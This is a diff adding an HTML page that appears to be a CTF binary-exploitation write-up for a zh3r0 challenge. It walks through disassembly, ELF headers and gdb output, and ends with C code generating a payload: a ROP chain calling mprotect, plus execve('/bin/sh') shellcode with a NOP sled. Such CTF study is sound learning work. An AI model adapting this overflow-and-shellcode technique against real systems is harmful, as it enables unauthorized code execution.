@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>www.rootstorm.com</title>
+    <link rel="stylesheet" href="../css/app.css">
+</head>
+
+<body>
+    <video src="../video/space.mp4" loop autoplay id="video" muted></video>
+    <main>
+        <pre>
+    <section class="comment">
+        M. Walker
+        the-scientist@rootstorm.com
+        binary exploitation.
+    </section>
+        the-scientist@kali:~/CTF/zh3r0/binary_exploit/32_64$ objdump -D -M intel chall
+
+        chall:     file format elf64-x86-64
+        Disassembly of section .note.gnu.build-id:
+        00000000004000e8 <.note.gnu.build-id>:
+                ...
+        
+        Disassembly of section .text:
+        
+        0000000000400130 <.text>:
+          400130:       55                      push   rbp
+          400131:       48 89 e5                mov    rbp,rsp
+          400134:       48 83 ec 20             sub    rsp,0x20
+          400138:       31 c0                   xor    eax,eax
+          40013a:       bf 01 00 00 00          mov    edi,0x1
+          40013f:       b0 01                   mov    al,0x1
+          400141:       48 c7 c6 e4 01 60 00    mov    rsi,0x6001e4
+          400148:       ba 19 00 00 00          mov    edx,0x19
+          40014d:       0f 05                   syscall 
+          40014f:       b0 00                   mov    al,0x0
+          400151:       4c 8d 7d e0             lea    r15,[rbp-0x20]
+          400155:       4c 89 fe                mov    rsi,r15
+          400158:       48 c7 c7 00 00 00 00    mov    rdi,0x0
+          40015f:       48 c7 c2 2c 00 00 00    mov    rdx,0x2c
+          400166:       0f 05                   syscall 
+          400168:       48 89 f7                mov    rdi,rsi
+          40016b:       49 89 ff                mov    r15,rdi
+          40016e:       48 c7 c6 fd 01 60 00    mov    rsi,0x6001fd
+          400175:       48 c7 c7 01 00 00 00    mov    rdi,0x1
+          40017c:       48 c7 c0 01 00 00 00    mov    rax,0x1
+          400183:       48 c7 c2 07 00 00 00    mov    rdx,0x7
+          40018a:       0f 05                   syscall 
+          40018c:       4c 89 fe                mov    rsi,r15
+          40018f:       48 c7 c0 01 00 00 00    mov    rax,0x1
+          400196:       48 c7 c2 20 00 00 00    mov    rdx,0x20
+          40019d:       0f 05                   syscall 
+          40019f:       bf 01 00 00 00          mov    edi,0x1
+          4001a4:       b8 01 00 00 00          mov    eax,0x1
+          4001a9:       be 05 02 60 00          mov    esi,0x600205
+          4001ae:       ba 12 00 00 00          mov    edx,0x12
+          4001b3:       0f 05                   syscall 
+          4001b5:       b8 00 00 00 00          mov    eax,0x0
+          4001ba:       bf 00 00 00 00          mov    edi,0x0
+          4001bf:       be 00 00 60 00          mov    esi,0x600000
+          4001c4:       ba 00 02 00 00          mov    edx,0x200
+          4001c9:       0f 05                   syscall 
+          4001cb:       48 89 c7                mov    rdi,rax
+          4001ce:       48 31 c0                xor    rax,rax
+          4001d1:       5b                      pop    rbx
+          4001d2:       5a                      pop    rdx
+          4001d3:       5e                      pop    rsi
+          4001d4:       59                      pop    rcx
+          4001d5:       c9                      leave  
+          4001d6:       49 c7 c7 23 00 00 00    mov    r15,0x23
+          4001dd:       4c 89 7c 24 08          mov    QWORD PTR [rsp+0x8],r15
+          4001e2:       48 cb                   rex.W retf 
+        
+        Disassembly of section .data:
+        
+        00000000006001e4 <.data>:
+          6001e4:       50                      push   rax
+          6001e5:       6c                      ins    BYTE PTR es:[rdi],dx
+          6001e6:       65 61                   gs (bad) 
+          6001e8:       73 65                   jae    0x60024f
+          6001ea:       20 65 6e                and    BYTE PTR [rbp+0x6e],ah
+          6001ed:       74 65                   je     0x600254
+          6001ef:       72 20                   jb     0x600211
+          6001f1:       79 6f                   jns    0x600262
+          6001f3:       75 72                   jne    0x600267
+          6001f5:       20 6e 61                and    BYTE PTR [rsi+0x61],ch
+          6001f8:       6d                      ins    DWORD PTR es:[rdi],dx
+          6001f9:       65 3a 20                cmp    ah,BYTE PTR gs:[rax]
+          6001fc:       0a 48 65                or     cl,BYTE PTR [rax+0x65]
+          6001ff:       6c                      ins    BYTE PTR es:[rdi],dx
+          600200:       6c                      ins    BYTE PTR es:[rdi],dx
+          600201:       6f                      outs   dx,DWORD PTR ds:[rsi]
+          600202:       2c 20                   sub    al,0x20
+          600204:       00 53 6f                add    BYTE PTR [rbx+0x6f],dl
+          600207:       6d                      ins    DWORD PTR es:[rdi],dx
+          600208:       65 20 66 65             and    BYTE PTR gs:[rsi+0x65],ah
+          60020c:       65 64 62 61             gs fs (bad) 
+          600210:       63 6b 20                movsxd ebp,DWORD PTR [rbx+0x20]
+          600213:       3a 20                   cmp    ah,BYTE PTR [rax]
+          600215:       20 0a                   and    BYTE PTR [rdx],cl
+    <section class="comment">
+        After peaking at the prologue we see the stack is structured as follows
+        rbp + 8
+        rbp
+        rbp - 8
+        rbp + 10
+        rbp + 18
+        rbp + 20
+    </section>
+          40014f:       b0 00                   mov    al,0x0
+          400151:       4c 8d 7d e0             lea    r15,[rbp-0x20]
+          400155:       4c 89 fe                mov    rsi,r15
+          400158:       48 c7 c7 00 00 00 00    mov    rdi,0x0
+          40015f:       48 c7 c2 2c 00 00 00    mov    rdx,0x2c
+          400166:       0f 05                   syscall 
+    <section class="comment">        
+        The above reads 0x2c into the stack overwriting rbp and 4 bytes of our return address. [rbp + 8] so we've found an exploit in this binary. 
+    </section>
+          4001b5:       b8 00 00 00 00          mov    eax,0x0
+          4001ba:       bf 00 00 00 00          mov    edi,0x0
+          4001bf:       be 00 00 60 00          mov    esi,0x600000
+          4001c4:       ba 00 02 00 00          mov    edx,0x200
+          4001c9:       0f 05                   syscall 
+    <section class="comment">
+        This reads 0x200 bytes below the .data section which actually writes into the data section
+    </section>
+          4001d6:       49 c7 c7 23 00 00 00    mov    r15,0x23
+          4001dd:       4c 89 7c 24 08          mov    QWORD PTR [rsp+0x8],r15
+          4001e2:       48 cb                   rex.W retf 
+    <section class="comment">
+        Everything is switched to 32 bit mode (take note of this for the int80 rop gadget)
+    </section>
+        the-scientist@kali:~/CTF/zh3r0/binary_exploit/32_64$ readelf -a chall
+        ELF Header:
+          Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 
+          Class:                             ELF64
+          Data:                              2's complement, little endian
+          Version:                           1 (current)
+          OS/ABI:                            UNIX - System V
+          ABI Version:                       0
+          Type:                              EXEC (Executable file)
+          Machine:                           Advanced Micro Devices X86-64
+          Version:                           0x1
+          Entry point address:               0x400130
+          Start of program headers:          64 (bytes into file)
+          Start of section headers:          584 (bytes into file)
+          Flags:                             0x0
+          Size of this header:               64 (bytes)
+          Size of program headers:           56 (bytes)
+          Number of program headers:         3
+          Size of section headers:           64 (bytes)
+          Number of section headers:         5
+          Section header string table index: 4
+        
+        Section Headers:
+          [Nr] Name              Type             Address           Offset
+               Size              EntSize          Flags  Link  Info  Align
+          [ 0]                   NULL             0000000000000000  00000000                                                                                                                                                                       
+               0000000000000000  0000000000000000           0     0     0                                                                                                                                                                          
+          [ 1] .note.gnu.build-i NOBITS           00000000004000e8  000000e8                                                                                                                                                                       
+               0000000000000039  0000000000000000  AX       0     0     4                                                                                                                                                                          
+          [ 2] .text             PROGBITS         0000000000400130  00000130                                                                                                                                                                       
+               00000000000000b4  0000000000000000  AX       0     0     16                                                                                                                                                                         
+          [ 3] .data             PROGBITS         00000000006001e4  000001e4                                                                                                                                                                       
+               0000000000000033  0000000000000000  WA       0     0     4                                                                                                                                                                          
+          [ 4] .shstrtab         STRTAB           0000000000000000  00000217                                                                                                                                                                       
+               000000000000002a  0000000000000000           0     0     1                                                                                                                                                                          
+        Key to Flags:                                                                                                                                                                                                                              
+          W (write), A (alloc), X (execute), M (merge), S (strings), I (info),                                                                                                                                                                     
+          L (link order), O (extra OS processing required), G (group), T (TLS),                                                                                                                                                                    
+          C (compressed), x (unknown), o (OS specific), E (exclude),                                                                                                                                                                               
+          l (large), p (processor specific)                                                                                                                                                                                                        
+                                                                                                                                                                                                                                                   
+        There are no section groups in this file.                                                                                                                                                                                                  
+                                                                                                                                                                                                                                                   
+        Program Headers:                                                                                                                                                                                                                           
+          Type           Offset             VirtAddr           PhysAddr                                                                                                                                                                            
+                         FileSiz            MemSiz              Flags  Align
+          LOAD           0x0000000000000000 0x0000000000400000 0x0000000000400000
+                         0x00000000000001e4 0x00000000000001e4  R E    0x200000
+          LOAD           0x00000000000001e4 0x00000000006001e4 0x00000000006001e4
+                         0x0000000000000033 0x0000000000000033  RW     0x200000
+          GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
+                         0x0000000000000000 0x0000000000000000  RW     0x10
+        
+         Section to Segment mapping:
+          Segment Sections...
+           00     .note.gnu.build-id .text 
+           01     .data 
+           02     
+    <section class="comment">
+        There is no dynamic section, no relocations, decoding of unwind sections for machine type 
+        Advanced Micro Devices X86-64 is not currently supported, no version information is found in this file.
+        The .data section is not executable, so we're going to need to find a rop gadget since the NX bit is also set. 
+        This binary contains an interesting section which we will examine further with gdb
+    </section>
+        [1] .note.gnu.build-i NOBITS           00000000004000e8  000000e8                                                                                                                                                                       
+               0000000000000039  0000000000000000  AX       0     0     4 
+        gdb-peda$ x/6i 0x00000000004000e8
+           0x4000e8:    mov    eax,edi
+           0x4000ea:    mov    esp,esi
+           0x4000ec:    cmp    eax,0xb
+           0x4000ef:    je     0x800290
+           0x4000f5:    int    0x80
+    <section class="comment">
+        This rop gadget gives us the ability to make a system call. cmp eax, 0xb is checked which means we cant execve()
+    </section>        
+          4001cb:       48 89 c7                mov    rdi,rax
+          4001ce:       48 31 c0                xor    rax,rax
+          4001d1:       5b                      pop    rbx
+          4001d2:       5a                      pop    rdx
+          4001d3:       5e                      pop    rsi
+          4001d4:       59                      pop    rcx
+    <section class="comment">
+        Everything needed to set up a system call is found above, the rdi value will be the return from the prior read(). 
+        We wont be able to execveat() here since we dont have controll over the register that would contain the flag
+        We can call sys_mprotect! we can also call sys_sigreturn which would be another solution to get this flag
+<code>
+/* 
+ * This is a working exploit, for the vulnerability we identified in the above binary
+ * the-scientist@rootstorm.com
+ */
+</section>
+<span class="brownish">#</span><span class="include">include </span><span class="lt">&lt;</span>sys/types.h<span class="gt">&gt;</span>
+<span class="brownish">#</span><span class="include">include </span><span class="lt">&lt;</span>sys/stat.h<span class="gt">&gt;</span>
+<span class="brownish">#</span><span class="include">include </span><span class="lt">&lt;</span>fcntl.h<span class="gt">&gt;</span>
+<span class="brownish">#</span><span class="include">include </span><span class="lt">&lt;</span>unistd.<span class="gt">h&gt;</span>
+<span class="brownish">#</span><span class="include">include </span><span class="lt">&lt;</span>stdio.h<span class="gt">&gt;</span>
+<span class="brownish">#</span><span class="include">include </span><span class="lt">&lt;</span>string.h<span class="gt">&gt;</span>
+
+<span class="brownish">#</span><span class="def">define</span> <span class="brownish">STACK_SIZE</span> 44
+<span class="brownish">#</span><span class="def">define</span> <span class="brownish">DATA_SECTION_SIZE</span> 125
+                                                                    <span class="comment">// stack sets up parameters to be passed to mprotec</span>
+<span class="vars">const char *</span><span class="brownish">stack</span> = {                                                <span class="comment">// the address range in the interval [addr, addr+len-1].  addr must be aligned to a page boundary.</span>
+    <span class="brownish">"</span>\x00\x00\x60\x00\x00\x00\x00\x00<span class="brownish">"</span>                              <span class="comment">// %rbx [rbp - 0x20] region of memory to make executable</span>
+    <span class="brownish">"</span>\x07\x00\x00\x00\x00\x00\x00\x00<span class="brownish">"</span>                              <span class="comment">// %rdx [rbp - 0x18] argument PROT_EXEC to make memory executable</span>
+    <span class="brownish">"</span>\x00\x00\x60\x00\x00\x00\x00\x00<span class="brownish">"</span>                              <span class="comment">// %rsi [rbp - 0x10] NOTE 32 bit: (where the payload will live in the .data section)</span>
+    <span class="brownish">"</span>\x7d\x00\x00\x00\x00\x00\x00\x00<span class="brownish">"</span>                              <span class="comment">// %rcx [rbp - 0x08] 125 byte sz for mprotect .data region to make executable</span>
+    <span class="brownish">"</span>\x00\x00\x00\x00\x00\x00\x00\x00<span class="brownish">"</span>                              <span class="comment">// %rbp [rbp] padding</span>
+    <span class="brownish">"</span>\xe8\x00\x40\x00<span class="brownish">"</span>                                              <span class="comment">// %eip [rbp  + 8] the address of our rop gadget note: 32 bit mode (rex.W retf)</span>
+    <span class="brownish">"</span>\x0c\x00\x60\x00<span class="brownish">"</span>                                              <span class="comment">// The return value from read() sets %rax to system call sys_mprotect</span>
+    <span class="brownish">"</span>/bin/sh\x00<span class="brownish">"</span>                                                   <span class="comment">// data for execve() in shellcode to use. 0x600004 "\x04\x00\x60\x00" <--- offset to /bin/sh</span>
+    <span class="brownish">"</span>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90<span class="brownish">"</span> 
+    <span class="brownish">"</span>\xbb\x04\x00\x60\x00<span class="brownish">"</span>                                          <span class="comment">// mov    ebx, 0x600004 ; %ebx = const char *filename = 0x600004</span>
+    <span class="brownish">"</span>\x31\xc9<span class="brownish">"</span>                                                      <span class="comment">// xor    ecx,ecx       ; %ecx = const char *const argv[] = 0x00</span>
+    <span class="brownish">"</span>\x31\xd2<span class="brownish">"</span>                                                      <span class="comment">// xor    edx,edx       ; %edx = const char *const envp[] = 0x00</span>
+    <span class="brownish">"</span>\xb8\x0b\x00\x00\x00<span class="brownish">"</span>                                          <span class="comment">// mov    eax, 0x0b     ; %eax = sys_execve = 11 = 0x0b</span>
+    <span class="brownish">"</span>\xcd\x80<span class="brownish">"</span>                                                      <span class="comment">// int    0x80          ; execve("/bin/sh", NULL, NULL);</span>
+    <span class="brownish">"</span>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90<span class="brownish">"</span> 
+    <span class="brownish">"</span>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90<span class="brownish">"</span> 
+    <span class="brownish">"</span>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90<span class="brownish">"</span> 
+    <span class="brownish">"</span>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90<span class="brownish">"</span> 
+    <span class="brownish">"</span>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90<span class="brownish">"</span> 
+    <span class="brownish">"</span>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90<span class="brownish">"</span> 
+    <span class="brownish">"</span>\x90\x90<span class="brownish">"</span> 
+};
+
+<span class="vars">int</span> <span class="brownish">main</span> (<span class="vars">int</span> <span class="brownish">argc</span>, <span class="vars">char</span> <span class="vars">*</span><span class="brownish">argv</span><span class="vars">[]</span>)
+{
+    <span class="vars">int</span> <span class="brownish">fd</span> = <span class="vars">open</span>(<span class="brownish">"payload"</span>, <span class="brownish">O_WRONLY</span> | <span class="brownish">O_CREAT</span>);
+    <span class="vars">if</span> (<span class="brownish">fd</span> == -1) {
+        <span class="vars">fprintf</span>(<span class="brownish">stderr</span>, <span class="brownish">"open()"</span>);
+        <span class="vars">return</span> 255;
+    }
+    <span class="vars">if</span> (<span class="vars">write</span>(<span class="brownish">fd</span>, <span class="brownish">stack</span>, <span class="brownish">STACK_SIZE</span> + <span class="brownish">DATA_SECTION_SIZE</span>) == -1) { 
+        <span class="vars">return</span> 255;
+    }
+    <span class="vars">if</span> (<span class="vars">close</span>(<span class="brownish">fd</span>) == -1) {
+        <span class="vars">fprintf</span>(<span class="brownish">stderr</span>, <span class="brownish">"close()"</span>);
+        <span class="vars">return</span> 255;
+    }
+    <span class="vars">return</span> 0;
+}
+</code>
+</pre>
+    </main>
+    <footer>
+        <nav class="nav">
+            <span class="ctf_link">
+                <a href="https://ctftime.org/team/123580">CTF </a>
+            </span>
+            <span class="code_link">
+                <a href="https://github.com/thesc1ent1st">CODE </a>
+            </span>
+        </nav>
+        <span>&copy; <a href="mailto://the-scientist@rootstorm.com">the-scientist@rootstorm.com</a>
+    </footer>
+</body>
+
+</html>
